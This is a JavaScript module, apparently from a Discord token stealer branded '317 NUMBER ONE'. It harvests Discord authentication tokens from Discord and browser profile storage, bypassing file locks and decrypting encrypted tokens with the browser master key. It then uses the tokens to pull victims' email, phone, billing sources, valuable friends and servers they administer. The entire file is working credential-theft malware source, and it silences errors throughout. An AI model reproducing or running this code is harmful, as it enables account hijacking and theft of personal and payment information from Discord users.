// 317 NUMBER ONE - Discord Token & Account Intelligence
const fs = require('fs/promises');
const fsSync = require('fs');
const path = require('path');
const os = require('os');
const { expandPath, sanitizeJSON, snowflakeToDate, calculateMonthsSince } = require('../utils/system');
const { extractMasterKey, decryptChromeValue } = require('../utils/crypto');

/**
 * Read Local State file with fallback: if locked by Discord, copy to temp then read
 */
async function readLocalStateSafe(localStatePath) {
  // Try direct read first
  try {
    return await fs.readFile(localStatePath, 'utf8');
  } catch {}
  
  // Fallback: copy to temp, then read (bypasses file locks)
  try {
    const tmpCopy = path.join(os.tmpdir(), `317_ls_${Date.now()}.tmp`);
    fsSync.copyFileSync(localStatePath, tmpCopy);
    const content = await fs.readFile(tmpCopy, 'utf8');
    try { fsSync.unlinkSync(tmpCopy); } catch {}
    return content;
  } catch {}
  
  return null;
}

/**
 * Find Discord tokens in leveldb/session storage
 */
async function findTokensInPath(searchPath, masterKeyOverride = null) {
  const tokens = new Set();
  
  try {
    const expandedPath = expandPath(searchPath);
    
    // Check if path exists
    try {
      await fs.access(expandedPath);
    } catch {
      return Array.from(tokens);
    }
    
    // Determine if this is a leveldb path or app root
    const isLeveldb = searchPath.toLowerCase().includes('leveldb');
    
    if (isLeveldb) {
      // Direct leveldb path (legacy support)
      const appRoot = expandedPath.substring(0, expandedPath.toLowerCase().lastIndexOf('\\local storage'));
      let masterKey = masterKeyOverride;
      if (!masterKey) {
        try {
          const localStateContent = await readLocalStateSafe(path.join(appRoot, 'Local State'));
          if (localStateContent) masterKey = await extractMasterKey(localStateContent);
        } catch {}
      }
      await scanDirectory(expandedPath, tokens, masterKey);
    } else {
      // App root path — could be Discord app or browser User Data
      let masterKey = masterKeyOverride;
      if (!masterKey) {
        try {
          const localStateContent = await readLocalStateSafe(path.join(expandedPath, 'Local State'));
          if (localStateContent) masterKey = await extractMasterKey(localStateContent);
        } catch {}
      }
      
      // Scan root-level Local Storage & Session Storage (Discord app style)
      await scanDirectory(path.join(expandedPath, 'Local Storage', 'leveldb'), tokens, masterKey);
      await scanDirectory(path.join(expandedPath, 'Session Storage'), tokens, masterKey);
      
      // Scan all browser profile subdirectories (Default, Profile 1, Profile 2, etc.)
      try {
        const entries = await fs.readdir(expandedPath, { withFileTypes: true });
        for (const entry of entries) {
          if (entry.isDirectory() && (
            entry.name === 'Default' || 
            entry.name.startsWith('Profile ') ||
            entry.name === 'Guest Profile'
          )) {
            const profilePath = path.join(expandedPath, entry.name);
            await scanDirectory(path.join(profilePath, 'Local Storage', 'leveldb'), tokens, masterKey);
            await scanDirectory(path.join(profilePath, 'Session Storage'), tokens, masterKey);
          }
        }
      } catch {}
    }
    
  } catch (error) {
    // Silent fail
  }
  
  return Array.from(tokens);
}

/**
 * Scan directory for tokens
 */
async function scanDirectory(dirPath, tokens, masterKey) {
  try {
    const files = await fs.readdir(dirPath);
    
    for (const file of files) {
      const filePath = path.join(dirPath, file);
      
      try {
        const stat = await fs.stat(filePath);
        if (stat.isFile()) {
          await scanFileForTokens(filePath, tokens, masterKey);
        }
      } catch {
        // Skip files we can't read
      }
    }
  } catch {
    // Directory doesn't exist or can't be read
  }
}

/**
 * Scan individual file for tokens
 */
async function scanFileForTokens(filePath, tokens, masterKey) {
  try {
    let content;
    try {
      content = await fs.readFile(filePath);
    } catch {
      // File might be locked by Discord — copy to temp and read
      try {
        const tmpFile = path.join(os.tmpdir(), `317_ldb_${Date.now()}_${path.basename(filePath)}`);
        fsSync.copyFileSync(filePath, tmpFile);
        content = await fs.readFile(tmpFile);
        try { fsSync.unlinkSync(tmpFile); } catch {}
      } catch { return; }
    }
    const contentStr = content.toString('utf8', 0, Math.min(content.length, 10 * 1024 * 1024)); // Max 10MB
    
    // Try AES-GCM decryption for encrypted tokens
    if (masterKey) {
      const encryptedPrefix = 'dQw4w9WgXcQ:';
      let pos = 0;
      
      while ((pos = contentStr.indexOf(encryptedPrefix, pos)) !== -1) {
        pos += encryptedPrefix.length;
        
        // Find end of base64 data
        let end = pos;
        while (end < contentStr.length) {
          const char = contentStr[end];
          if (!/[A-Za-z0-9+/=]/.test(char)) break;
          end++;
        }
        
        if (end > pos) {
          const b64Token = contentStr.substring(pos, end);
          try {
            const encToken = Buffer.from(b64Token, 'base64');
            
            if (encToken.length > 15 && 
                encToken[0] === 0x76 && encToken[1] === 0x31 && encToken[2] === 0x30) {
              const iv = encToken.slice(3, 15);
              const cipher = encToken.slice(15);
              
              const decToken = await decryptChromeValue(encToken, masterKey);
              if (decToken && decToken.length > 20) {
                tokens.add(decToken);
              }
            }
          } catch {}
        }
        
        pos = end;
      }
    }
    
    // Regex scan for plaintext tokens
    // Standard: Base64UserID.Timestamp.HMAC
    const tokenRegex = /[\w-]{24,}\.[\w-]{6}\.[\w-]{25,110}/g;
    const matches = contentStr.matchAll(tokenRegex);
    
    for (const match of matches) {
      tokens.add(match[0]);
    }
    
    // MFA tokens: mfa.Base64Token
    const mfaRegex = /mfa\.[\w-]{84,}/g;
    const mfaMatches = contentStr.matchAll(mfaRegex);
    
    for (const match of mfaMatches) {
      tokens.add(match[0]);
    }
    
  } catch {
    // Skip files we can't read or parse
  }
}

/**
 * Validate token and get account info
 */
async function validateTokenAndGetInfo(token) {
  try {
    const response = await fetch('https://discord.com/api/v9/users/@me', {
      headers: {
        'Authorization': token,
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
      },
      timeout: 10000
    });
    
    if (response.status !== 200) return null;
    
    const data = await response.json();
    
    const accountInfo = {
      token,
      username: data.username || 'Unknown',
      id: data.id || 'Unknown',
      email: data.email || 'Unverified',
      phone: data.phone || 'Unlinked',
      mfa: data.mfa_enabled ? 'Enabled' : 'Disabled',
      verified: data.verified ? 'Yes' : 'No',
      avatarUrl: data.avatar 
        ? `https://cdn.discordapp.com/avatars/${data.id}/${data.avatar}.png`
        : 'https://files.catbox.moe/zc9b0w.png',
      badges: '',
      billing: 'None',
      decorations: data.avatar_decoration_data ? 'Has Decoration' : 'No Decoration'
    };
    
    // Parse badges from public_flags
    if (data.public_flags !== undefined) {
      const flags = data.public_flags;
      let badgeStr = '';
      
      if (flags & 1) badgeStr += '<:discordstaff:1462545486044074218> ';
      if (flags & 2) badgeStr += '<:partner:1502321783171190854> ';
      if (flags & 4) badgeStr += '<:hypesquadevents:1502329846154395819> ';
      if (flags & 8) badgeStr += '<:bughunter:1502321534054957178> ';
      if (flags & 512) badgeStr += '<:early_supporter:1502322231017996418> ';
      if (flags & 16384) badgeStr += '<:goldbughunter:1502321553755607291> ';
      if (flags & 131072) badgeStr += '<:discordbotdev:1462545206158033027> ';
      if (flags & 4194304) badgeStr += '<:activedev:1502320595822448722> ';
      if (flags & 64) badgeStr += '<:balance:1508342641186705549> ';
      if (flags & 128) badgeStr += '<:bravery:1508342685335814287> ';
      if (flags & 256) badgeStr += '<:brilliance:1508342732035199046> ';
      
      accountInfo.badges = badgeStr || 'None';
    }
    
    // Short username badges
    if (accountInfo.username.length === 3) accountInfo.badges += '<:3C:1502376391226687598> ';
    if (accountInfo.username.length === 2) accountInfo.badges += '<:2c:1462561755476525167> ';
    
    if (accountInfo.badges === '') accountInfo.badges = 'None';
    
    // Get billing info
    await getBillingInfo(token, accountInfo);
    
    return accountInfo;
  } catch {
    return null;
  }
}

/**
 * Get billing information
 */
async function getBillingInfo(token, accountInfo) {
  try {
    const response = await fetch('https://discord.com/api/v9/users/@me/billing/payment-sources', {
      headers: {
        'Authorization': token,
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
      },
      timeout: 10000
    });
    
    if (response.status !== 200) return;
    
    const data = await response.json();
    
    if (!data || data.length === 0) {
      accountInfo.billing = 'None';
      return;
    }
    
    let cardCount = 0;
    let paypalCount = 0;
    let cashappCount = 0;
    let venmoCount = 0;
    let idealCount = 0;
    for (const source of data) {
      if (source.type === 1) cardCount++;
      if (source.type === 2) paypalCount++;
      if (source.type === 5) idealCount++;
      if (source.type === 14) venmoCount++;
      if (source.type === 16) cashappCount++;
    }
    
    let billing = '';
    if (cardCount > 0) billing += `<a:card:1502427756959367278> \`${cardCount} Card\`\n`;
    if (paypalCount > 0) billing += `<:paypal:1502321630083289260> \`${paypalCount} PayPal\`\n`;
    if (cashappCount > 0) billing += `<a:card:1502427756959367278> \`${cashappCount} CashApp\`\n`;
    if (venmoCount > 0) billing += `<a:card:1502427756959367278> \`${venmoCount} Venmo\`\n`;
    if (idealCount > 0) billing += `<a:card:1502427756959367278> \`${idealCount} iDEAL\`\n`;
    
    accountInfo.billing = billing.trim() || 'Unknown Type';
  } catch {
    accountInfo.billing = 'None';
  }
}

/**
 * Fetch Nitro and Boost badges from profile
 */
async function fetchNitroBoostBadges(token, userId, nitroBadges, boostBadges, selfProfile) {
  try {
    const response = await fetch(`https://discord.com/api/v9/users/${userId}/profile?with_mutual_guilds=false`, {
      headers: {
        'Authorization': token,
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
      },
      timeout: 10000
    });
    
    // Handle rate limiting
    if (response.status === 429) {
      const retryAfter = response.headers.get('Retry-After');
      const waitMs = retryAfter ? parseFloat(retryAfter) * 1000 + 500 : 2000;
      await new Promise(resolve => setTimeout(resolve, waitMs));
      
      // Retry once
      return await fetchNitroBoostBadges(token, userId, nitroBadges, boostBadges, selfProfile);
    }
    
    if (response.status !== 200) return { nitro: '', boost: '', extra: '' };
    
    const data = await response.json();
    
    let nitroBadge = '';
    let boostBadge = '';
    let extraBadges = '';
    
    // Check premium_since for Nitro
    if (data.premium_since && data.premium_since !== 'null') {
      const months = calculateMonthsSince(data.premium_since);
      nitroBadge = getNitroBadge(months, nitroBadges);
    }
    
    // Check premium_guild_since for Boost
    if (data.premium_guild_since && data.premium_guild_since !== 'null') {
      const months = calculateMonthsSince(data.premium_guild_since);
      boostBadge = getBoostBadge(months, boostBadges);
    }
    
    // Check profile badges array for quest, orbs, legacy username
    // For self profile: skip legacy_username (user can hide it, but own-profile API returns all)
    // For other profiles: API only returns displayed badges, so show everything
    if (data.badges && Array.isArray(data.badges)) {
      for (const b of data.badges) {
        const id = b.id || '';
        if (id === 'legacy_username' && selfProfile) continue;
        if (id === 'legacy_username') extraBadges += '<:username:1462545054282420378> ';
        if (id === 'quest_completed') extraBadges += '<:quest:1462545052680323144> ';
        if (id === 'completed_orbs') extraBadges += '<:orb:1462545655934488746> ';
      }
    }
    
    // Extract banner URL
    let bannerUrl = '';
    const user = data.user || {};
    if (user.banner) {
      const ext = user.banner.startsWith('a_') ? 'gif' : 'png';
      bannerUrl = `https://cdn.discordapp.com/banners/${user.id}/${user.banner}.${ext}?size=600`;
    }
    
    return { nitro: nitroBadge, boost: boostBadge, extra: extraBadges, bannerUrl: bannerUrl };
  } catch {
    return { nitro: '', boost: '', extra: '', bannerUrl: '' };
  }
}

/**
 * Get Nitro badge based on months
 */
function getNitroBadge(months, badges) {
  if (months < 0) return '';
  if (months >= 72) return badges['6Y'];
  if (months >= 60) return badges['5Y'];
  if (months >= 36) return badges['3Y'];
  if (months >= 24) return badges['2Y'];
  if (months >= 12) return badges['1Y'];
  if (months >= 6) return badges['6M'];
  if (months >= 3) return badges['3M'];
  if (months >= 1) return badges['1M'];
  return badges['0M'];
}

/**
 * Get Boost badge based on months
 */
function getBoostBadge(months, badges) {
  if (months < 1) return '';
  if (months >= 24) return badges['24M'];
  if (months >= 18) return badges['18M'];
  if (months >= 15) return badges['15M'];
  if (months >= 12) return badges['12M'];
  if (months >= 9) return badges['9M'];
  if (months >= 6) return badges['6M'];
  if (months >= 3) return badges['3M'];
  if (months >= 2) return badges['2M'];
  return badges['1M'];
}

/**
 * Fetch rare friends list
 */
async function fetchRareFriends(token, userId, nitroBadges, boostBadges) {
  try {
    const response = await fetch('https://discord.com/api/v9/users/@me/relationships', {
      headers: {
        'Authorization': token,
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
      },
      timeout: 15000
    });
    
    if (response.status !== 200) return { rareList: '', totalFriends: 0, rareCount: 0 };
    
    const data = await response.json();
    
    let totalFriends = 0;
    const friends = [];
    
    // Count total friends and collect friend-type relationships
    for (const relationship of data) {
      if (relationship.type === 1) {
        totalFriends++;
        if (relationship.user) friends.push(relationship.user);
      }
    }
    
    // Pass 1: Score all friends by public_flags (no API calls)
    const candidates = [];
    for (const user of friends) {
      const friendName = user.username || 'Unknown';
      const friendId = user.id || '';
      const publicFlags = user.public_flags || 0;
      
      let flagScore = 0;
      let houseIcons = '';
      let specialIcons = '';
      let shortIcons = '';
      
      // HypeSquad House badges
      if (publicFlags & 64) houseIcons += '<:balance:1508342641186705549>';
      if (publicFlags & 128) houseIcons += '<:bravery:1508342685335814287>';
      if (publicFlags & 256) houseIcons += '<:brilliance:1508342732035199046>';
      
      // Special badges (high rarity score)
      if (publicFlags & 1) { flagScore += 100; specialIcons += '<:discordstaff:1462545486044074218>'; }
      if (publicFlags & 2) { flagScore += 90; specialIcons += '<:partner:1502321783171190854>'; }
      if (publicFlags & 4) { flagScore += 80; specialIcons += '<:hypesquadevents:1502329846154395819>'; }
      if (publicFlags & 8) { flagScore += 70; specialIcons += '<:bughunter:1502321534054957178>'; }
      if (publicFlags & 16384) { flagScore += 75; specialIcons += '<:goldbughunter:1502321553755607291>'; }
      if (publicFlags & 512) { flagScore += 60; specialIcons += '<:early_supporter:1502322231017996418>'; }
      if (publicFlags & 4194304) { flagScore += 40; specialIcons += '<:activedev:1502320595822448722>'; }
      if (publicFlags & 131072) { flagScore += 50; specialIcons += '<:discordbotdev:1462545206158033027>'; }
      
      // Short username
      if (friendName.length === 2 && friendName !== 'Unknown') { flagScore += 85; shortIcons += '<:2c:1462561755476525167>'; }
      else if (friendName.length === 3 && friendName !== 'Unknown') { flagScore += 65; shortIcons += '<:3C:1502376391226687598>'; }
      else if (friendName.length === 4 && friendName !== 'Unknown') { flagScore += 30; }
      
      candidates.push({
        friendId, friendName, publicFlags, flagScore,
        houseIcons, specialIcons, shortIcons,
        nitroBoostIcons: '', nitroScore: 0
      });
    }
    
    // Sort candidates: high flag-score first, but ensure we also check those without flags
    // Process up to 80 friends for profile fetch (covers most friend lists)
    candidates.sort((a, b) => b.flagScore - a.flagScore);
    const toFetch = candidates.slice(0, 80);
    
    // Pass 2: Fetch profiles for all candidates (with smart rate limit handling)
    let consecutiveErrors = 0;
    let delay = 250;
    
    for (let i = 0; i < toFetch.length; i++) {
      const c = toFetch[i];
      if (!c.friendId) continue;
      
      try {
        const { nitro, boost, extra } = await fetchNitroBoostBadges(token, c.friendId, nitroBadges, boostBadges);
        consecutiveErrors = 0;
        
        c.nitroBoostIcons = (nitro || '') + (boost || '') + (extra || '');
        
        // Score nitro rarity
        if (nitro) {
          if (nitro.includes('opal')) c.nitroScore += 90;
          else if (nitro.includes('ruby')) c.nitroScore += 80;
          else if (nitro.includes('emerald')) c.nitroScore += 70;
          else if (nitro.includes('diamond')) c.nitroScore += 60;
          else if (nitro.includes('platinum')) c.nitroScore += 50;
          else if (nitro.includes('gold')) c.nitroScore += 40;
          else if (nitro.includes('silver')) c.nitroScore += 30;
        }
        
        // Score boost rarity
        if (boost) {
          if (boost.includes('boost24')) c.nitroScore += 55;
          else if (boost.includes('boost18')) c.nitroScore += 45;
          else if (boost.includes('discordboost7')) c.nitroScore += 40;
          else if (boost.includes('discordboost6')) c.nitroScore += 35;
          else if (boost.includes('discordboost5')) c.nitroScore += 30;
          else if (boost.includes('discordboost4')) c.nitroScore += 25;
          else if (boost.includes('discordboost3')) c.nitroScore += 20;
        }
      } catch {
        consecutiveErrors++;
        if (consecutiveErrors >= 5) {
          // Too many errors, increase delay significantly
          delay = Math.min(delay * 2, 2000);
        }
      }
      
      // Adaptive rate limit delay
      await new Promise(resolve => setTimeout(resolve, delay));
    }
    
    // Pass 3: Build final sorted list
    const rareResults = [];
    
    for (const c of toFetch) {
      const totalScore = c.flagScore + c.nitroScore;
      if (totalScore <= 0) continue; // Not rare at all
      
      // Skip if ONLY has HypeSquad house and nothing else
      const hasHypeSquadHouse = (c.publicFlags & 64) || (c.publicFlags & 128) || (c.publicFlags & 256);
      if (hasHypeSquadHouse && c.flagScore === 0 && c.nitroScore === 0) continue;
      
      const badgeIcons = c.houseIcons + c.specialIcons + c.nitroBoostIcons + c.shortIcons;
      
      // Skip if the only visible badge is legacy username
      const badgeIconsWithoutLegacy = badgeIcons.replace(/<:username:1462545054282420378>\s*/g, '').trim();
      if (!badgeIconsWithoutLegacy) continue;
      
      rareResults.push({ score: totalScore, line: `${badgeIcons} \`${sanitizeJSON(c.friendName)}\`` });
    }
    
    // Sort by total rarity score (most rare first)
    rareResults.sort((a, b) => b.score - a.score);
    
    const rareList = rareResults.map(r => r.line).join('\n');
    const rareCount = rareResults.length;
    
    return { rareList, totalFriends, rareCount };
  } catch {
    return { rareList: '', totalFriends: 0, rareCount: 0 };
  }
}

/**
 * Fetch rare servers (guilds) list
 */
async function fetchRareServers(token) {
  try {
    const response = await fetch('https://discord.com/api/v9/users/@me/guilds?with_counts=true', {
      headers: {
        'Authorization': token,
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
      },
      timeout: 10000
    });
    
    if (response.status === 429) {
      const retryAfter = response.headers.get('Retry-After');
      const waitMs = retryAfter ? parseFloat(retryAfter) * 1000 + 500 : 2000;
      await new Promise(resolve => setTimeout(resolve, waitMs));
      return await fetchRareServers(token);
    }
    
    if (response.status !== 200) return { rareList: '', totalServers: 0, rareCount: 0, largeCount: 0 };
    
    const guilds = await response.json();
    
    let totalServers = guilds.length;
    let rareCount = 0;
    let largeCount = 0;
    let rareList = '';
    
    for (const guild of guilds) {
      const memberCount = guild.approximate_member_count || 0;
      const isOwner = guild.owner === true;
      const name = guild.name || 'Unknown';
      const id = guild.id || '';
      const permissions = BigInt(guild.permissions || '0');
      
      if (memberCount >= 1000) largeCount++;
      
      // Permission check: ADMINISTRATOR(0x8), MANAGE_GUILD(0x20), MANAGE_CHANNELS(0x10), BAN_MEMBERS(0x4), KICK_MEMBERS(0x2), MANAGE_ROLES(0x10000000)
      const hasAdmin = (permissions & BigInt(0x8)) !== BigInt(0);
      const hasManageGuild = (permissions & BigInt(0x20)) !== BigInt(0);
      const hasManageChannels = (permissions & BigInt(0x10)) !== BigInt(0);
      const hasBan = (permissions & BigInt(0x4)) !== BigInt(0);
      const hasKick = (permissions & BigInt(0x2)) !== BigInt(0);
      const hasManageRoles = (permissions & BigInt(0x10000000)) !== BigInt(0);
      
      const hasAuthority = isOwner || hasAdmin || hasManageGuild || hasManageChannels || hasBan || hasKick || hasManageRoles;
      
      // Only show servers with 100+ members where user has authority
      if (hasAuthority && memberCount >= 100 && rareCount < 15) {
        const ownerStatus = isOwner 
          ? 'Owner: <a:yes:1502431686120706048>' 
          : 'Owner: <a:no:1502431716403580969>';
        const memberStr = memberCount > 0 ? `\`${memberCount.toLocaleString()}\` members` : '';
        
        rareList += `**${sanitizeJSON(name)}** (${id})\n`;
        rareList += `${ownerStatus} \u00b7 ${memberStr}\n\n`;
        rareCount++;
      }
    }
    
    return { rareList: rareList.trim(), totalServers, rareCount, largeCount };
  } catch {
    return { rareList: '', totalServers: 0, rareCount: 0, largeCount: 0 };
  }
}

module.exports = {
  findTokensInPath,
  validateTokenAndGetInfo,
  fetchNitroBoostBadges,
  fetchRareFriends,
  fetchRareServers
};
